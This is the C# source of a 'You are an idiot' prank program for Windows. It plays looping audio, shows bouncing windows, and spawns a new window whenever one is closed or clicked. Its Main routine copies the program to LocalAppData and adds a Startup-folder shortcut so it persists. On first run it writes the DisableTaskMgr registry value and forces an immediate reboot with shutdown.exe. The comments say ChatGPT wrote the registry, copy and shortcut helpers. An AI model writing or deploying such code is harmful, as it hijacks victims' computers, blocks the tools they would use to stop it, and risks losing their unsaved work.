using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Media;
using NAudio.Wave;

namespace YouAreAnIdiotWindowsForms
{
    public class MainForm : Form
    {
        public static MainForm form = new MainForm();
        public Timer colorSwitchTimer;
        public bool isBlack = true; // was meant to check if the background color was black or white
        public static Timer updateTimer = new Timer // basically my equivalent of unity's Update() function, "runs at 60fps" machine fps will still vary it I think
        {
            Interval = 16 // 16ms
        };
        public static List<Form> forms = new List<Form>(); //A list of all the active "idiot tabs"
        public static List<FormMovement> movementStates = new List<FormMovement>(); //A list of all the movement states of each idiot tab
        public static List<bool> useNegativeHeights = new List<bool>(); //To check which direction to use for the y position.
        public static List<bool> useNegativeWidths = new List<bool>(); //To check which direction to use for the x position
        public static Random rand = new Random();

        // Never actually used the movement states lol
        public class FormMovement
        {
            public bool BouncedRight { get; set; }
            public bool BouncedLeft { get; set; }
            public bool BouncedTop { get; set; }
            public bool BouncedBottom { get; set; }
            public Point Velocity { get; set; }

            public FormMovement()
            {
                BouncedRight = false;
                BouncedLeft = false;
                BouncedTop = false;
                BouncedBottom = false;
                Velocity = new Point(16, 16); // Only used the velocity, basically gets added to the forms location every "frame" Runs at 60fps 
            }
        }

        public MainForm()
        {
            var audioFileReader = new AudioFileReader("You are an idiot!!.wav");
            var waveOutEvent = new WaveOutEvent();
            waveOutEvent.Init(audioFileReader);
            waveOutEvent.Play();

            // Dispose resources when playback finishes and restart playback
            waveOutEvent.PlaybackStopped += (s, e) =>
            {
                audioFileReader.Position = 0; // Reset to the beginning of the file
                waveOutEvent.Play(); // Replay the audio
            };

            // Create PictureBox
            PictureBox pictureBox = new PictureBox
            {
                // Set GIF file path (Ensure the file exists)
                ImageLocation = "You are an idiot!!.gif",
                SizeMode = PictureBoxSizeMode.StretchImage,
                Dock = DockStyle.Fill
            };

            this.Controls.Add(pictureBox);

            // Create Button that covers the entire form
            Button button = new Button
            {
                Size = new Size(392, 320),
                Location = new Point(0, 0),
                Text = "Hello",
                BackColor = Color.Transparent,
                FlatStyle = FlatStyle.Flat,
                ForeColor = Color.Transparent,
            };


            this.Controls.Add(button);

            // Set props
            this.Text = "You are an idiot!!";
            this.ClientSize = new Size(392, 320);
            this.Width = 392;
            this.Height = 320;
            this.Icon = new Icon("idiot icon.ico");
            this.BackColor = Color.Black;

            // was used before I set the gif to fully fill the idiot tab, didn't work very well lol
            colorSwitchTimer = new Timer
            {
                Interval = 620 // 0.smth seconds
            };
            colorSwitchTimer.Tick += ColorSwitchTimer_Tick;
            colorSwitchTimer.Start();


        }

        // handles anything that needs to be run once per frame, pretty much just the movement handling for each idiot tab
        private static void update_Tick(object sender, EventArgs e)
        {
            int index = 0;
            foreach (Form f in forms)
            {
                // Get screen's bounds manually
                int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
                int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;
                int screenX = Screen.PrimaryScreen.WorkingArea.X;
                int screenY = Screen.PrimaryScreen.WorkingArea.Y;

                if (f.Location.Y + f.Height >= screenHeight - f.Height) useNegativeHeights[index] = true; // check if the idiot tab is lower than the middle of the screen
                if (f.Location.Y + f.Height <= screenHeight - f.Height) useNegativeHeights[index] = false; // check if the idiot tab is higher than the middle of the screen
                int fHeight = f.Location.Y; // basically the y position offset the form is meant to be using when calculating its y pos 
                if (useNegativeHeights[index]) fHeight = f.Location.Y + f.Height;
                if (!useNegativeHeights[index]) fHeight = f.Location.Y;


                if (f.Location.X + f.Width >= screenWidth - f.Width) useNegativeWidths[index] = true;
                if (f.Location.X + f.Width <= screenWidth - f.Width) useNegativeWidths[index] = false;
                int fWidth = f.Location.X; // same thing as the fHeight but for width and x pos
                if (useNegativeWidths[index]) fWidth = f.Location.X + f.Width;
                if (!useNegativeWidths[index]) fWidth = f.Location.X;

                // check if the idiot tab is bouncing off the right side of the screen
                if (fWidth >= screenWidth)
                {
                    movementStates[index].Velocity = new Point(-movementStates[index].Velocity.X, movementStates[index].Velocity.Y);
                }

                // check if the idiot tab is bouncing off the left side of the screen
                if (fWidth <= screenX)
                {
                    movementStates[index].Velocity = new Point(-movementStates[index].Velocity.X, movementStates[index].Velocity.Y);
                }

                // check if the idiot tab is bouncing off the bottom of the screen? maybe top need to test
                if (fHeight >= screenHeight)
                {
                    movementStates[index].Velocity = new Point(movementStates[index].Velocity.X, -movementStates[index].Velocity.Y);
                }

                // check if the idiot tab is bouncing off the top of the screen? maybe bottom need to test
                if (fHeight <= screenY)
                {
                    movementStates[index].Velocity = new Point(movementStates[index].Velocity.X, -movementStates[index].Velocity.Y);
                }

                // Update the form location with new velocity
                f.Location = new Point(f.Location.X + movementStates[index].Velocity.X, f.Location.Y + movementStates[index].Velocity.Y);
                // just sum debugging //f.Text = $"({fWidth}, {fHeight}), vX: {movementStates[index].Velocity.X}, vY: {movementStates[index].Velocity.Y}, -h: {screenHeight - f.Height}, +h: {screenHeight + f.Height}, -w: {screenWidth - f.Width}, +w: {screenWidth + f.Width}, nH: {useNegativeHeights[index]}, nW: {useNegativeWidths[index]}";
                index++;
            }
        }

        // thx chatgpt, basically just creates a key in the registry that disables task manager
        static void DisableTaskManager()
        {
            try
            {
                // Navigate to the Registry key
                string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

                // Open or create the Registry key
                RegistryKey key = Registry.CurrentUser.CreateSubKey(registryKeyPath);

                if (key != null)
                {
                    // Create the DisableTaskMgr DWORD value and set it to 1 (disable Task Manager)
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

                    Console.WriteLine("Task Manager has been disabled.");
                }
                else
                {
                    Console.WriteLine("Failed to access the registry key.");
                }

                // Close the Registry key
                key.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        // thanks chatgpt, I was too lazy to code this lol, just copies the files to the local app data folder
        static void CopyFiles()
        {
            try
            {
                // Get the path of the current directory (where the program is running)
                string currentDirectory = Directory.GetCurrentDirectory();

                // Get the path of the Startup folder
                string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                // Ensure the Startup folder exists
                if (!Directory.Exists(startupFolderPath))
                {
                    Console.WriteLine("The folder does not exist.");
                    return;
                }

                // Get all files in the current directory
                string[] files = Directory.GetFiles(currentDirectory);

                foreach (string file in files)
                {
                    // Get the file name
                    string fileName = Path.GetFileName(file);

                    // Create the destination path in the Startup folder
                    string destinationPath = Path.Combine(startupFolderPath, fileName);

                    // Copy the file to the Startup folder
                    File.Copy(file, destinationPath, overwrite: true);

                    Console.WriteLine($"Copied {fileName} to folder.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        // thx chatgpt, didnt know how to do this so I just had it do it for me, pretty self explanitory
        static void CreateShortcut(string shortcutPath, string targetPath, string workingDirectory, string description)
        {
            Type type = Type.GetTypeFromProgID("WScript.Shell");
            dynamic shell = Activator.CreateInstance(type);
            dynamic shortcut = shell.CreateShortcut(shortcutPath);

            shortcut.TargetPath = targetPath;
            shortcut.WorkingDirectory = workingDirectory;
            shortcut.Description = description;
            shortcut.Save();

            Marshal.FinalReleaseComObject(shortcut);
            Marshal.FinalReleaseComObject(shell);
        }

        // again self explanitory
        public static void RestartSystem()
        {
            string restartCommand = "shutdown.exe /r /f /t 0";

            Process.Start("cmd.exe", "/C " + restartCommand);
        }

        // for the old timer
        private void ColorSwitchTimer_Tick(object sender, EventArgs e)
        {
            // Switch background color
            if (isBlack)
            {
                this.BackColor = Color.White;
            }
            else
            {
                this.BackColor = Color.Black;
            }

            isBlack = !isBlack;
        }

        [STAThread]
        static void Main()
        {
            form.Width = 392;
            form.Height = 320;

            form.Click += IdiotClicked;
            form.DoubleClick += IdiotClicked;
            form.MouseClick += IdiotClicked;
            form.MouseDoubleClick += IdiotClicked;
            form.FormClosing += IdiotClosing;
            // Run the application
            forms.Add(form);
            FormMovement idiotMovement = new FormMovement();
            movementStates.Add(idiotMovement);
            useNegativeHeights.Add(false);
            useNegativeWidths.Add(false);
            updateTimer.Tick += update_Tick;
            updateTimer.Start();
            CopyFiles();
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string shortcutPath = Path.Combine(startupFolderPath, "YouAreAnIdiot.lnk");
            string targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "YouAreAnIdiot.exe");
            CreateShortcut(shortcutPath, targetPath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "YouAreAnIdiot Application");
            if (!File.Exists("restarted") && !Environment.CurrentDirectory.Equals(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData))) // check to see if the program has already been ran once
            {
                File.Create("restarted");
                DisableTaskManager();
                RestartSystem();
            }
            Application.Run(form);
            int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
            int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;

            // Generate random X and Y coordinates within screen bounds
            int randomX = rand.Next(0, screenWidth - form.Width);
            int randomY = rand.Next(0, screenHeight - form.Height);

            // Set the form's location
            form.Location = new Point(randomX, randomY);

        }

        private static void IdiotClosing(object sender, FormClosingEventArgs e)
        {
            // Prevent form from closing
            e.Cancel = true;
            ShowIdiot();
        }

        private static void IdiotClicked(object sender, EventArgs e)
        {
            // Show a new form when clicked/doesnt work for some reason
            ShowIdiot();
        }

        private static void ShowIdiot()
        {
            // Create and show a new instance of the MainForm
            MainForm idiot = new MainForm();
            FormMovement idiotMovement = new FormMovement();
            idiot.FormClosing += IdiotClosing;
            idiot.Show();
            forms.Add(idiot);
            movementStates.Add(idiotMovement);
            useNegativeHeights.Add(false);
            useNegativeWidths.Add(false);
            int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
            int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;

            // Generate random X and Y coordinates within screen bounds
            int randomX = rand.Next(0, screenWidth - idiot.Width);
            int randomY = rand.Next(0, screenHeight - idiot.Height);

            // Set the form's location
            idiot.Location = new Point(randomX, randomY);
        }
    }
}
